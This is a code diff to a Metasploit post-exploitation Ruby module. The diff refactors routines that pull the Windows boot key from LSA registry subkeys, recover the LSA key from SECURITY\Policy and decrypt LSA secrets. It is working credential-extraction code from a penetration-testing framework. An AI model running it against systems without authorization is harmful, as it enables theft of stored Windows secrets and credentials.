@@ -92,7 +92,11 @@ module Msf::Post::Windows::Priv
     basekey = "System\\CurrentControlSet\\Control\\Lsa"
 
     %W{JD Skew1 GBG Data}.each do |k|
-      ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, basekey + "\\" + k, KEY_READ)
+      begin
+        ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, basekey + "\\" + k, KEY_READ)
+      rescue Rex::Post::Meterpreter::RequestError
+      end
+
       return nil if not ok
       bootkey << [ok.query_class.to_i(16)].pack("V")
       ok.close
@@ -155,26 +159,24 @@ module Msf::Post::Windows::Priv
   # Returns the LSA key upon input of the unscrambled bootkey
   #
   def capture_lsa_key(bootkey)
-    begin
-      vprint_status("Getting PolSecretEncryptionKey...")
-      ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\PolSecretEncryptionKey", KEY_READ)
-      pol = ok.query_value("").data
-      vprint_status("Got PolSecretEncryptionKey: #{pol.unpack("H*")[0]}")
-      ok.close
+    vprint_status("Getting PolSecretEncryptionKey...")
+    pol = registry_getvaldata("HKLM\\SECURITY\\Policy\\PolSecretEncryptionKey", "")
+    if pol
       print_status("XP or below client")
       @vista = 0
-    rescue
+    else
       vprint_status("Trying 'V72' style...")
       vprint_status("Getting PolEKList...")
-      ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\PolEKList", KEY_READ)
-      pol = ok.query_value("").data
-      vprint_good("Pol: #{pol.unpack("H*")[0]}")
-      ok.close
+      pol = registry_getvaldata("HKLM\\SECURITY\\Policy\\PolEKList", "")
       print_status("Vista or above client")
       @vista = 1
     end
+    # If that didn't work, then we're out of luck
+    return nil if pol.nil?
 
-    if( @vista == 1 )
+    vprint_good("Pol: #{pol.unpack("H*")[0]}")
+
+    if @vista == 1
       lsakey = decrypt_lsa_data(pol, bootkey)
       lsakey = lsakey[68,32]
       vprint_good(lsakey.unpack("H*")[0])
@@ -194,13 +196,15 @@ module Msf::Post::Windows::Priv
     return lsakey
   end
 
-  #
   # Decrypts the LSA encrypted data
   #
-  def decrypt_lsa_data(pol, encryptedkey)
+  # @param pol [String] The policy key stored in the registry
+  # @param encrypted_key [String]
+  # @return [String] The decrypted data
+  def decrypt_lsa_data(pol, encrypted_key)
 
     sha256x = Digest::SHA256.new()
-    sha256x << encryptedkey
+    sha256x << encrypted_key
     (1..1000).each do
       sha256x << pol[28,32]
     end
@@ -216,17 +220,20 @@ module Msf::Post::Windows::Priv
       aes.decrypt
       aes.padding = 0
       xx = aes.update(pol[i...i+16])
-      decrypted_data += xx
+      decrypted_data << xx
     end
-    vprint_good("Dec_Key #{decrypted_data}")
 
     return decrypted_data
   end
 
   # Decrypts "Secret" encrypted data
-  # Ruby implementation of SystemFunction005
-  # the original python code has been taken from Credump
   #
+  # Ruby implementation of SystemFunction005. The original python code
+  # has been taken from Credump
+  #
+  # @param secret [String]
+  # @param key [String]
+  # @return [String] The decrypted data
   def decrypt_secret_data(secret, key)
 
     j = 0
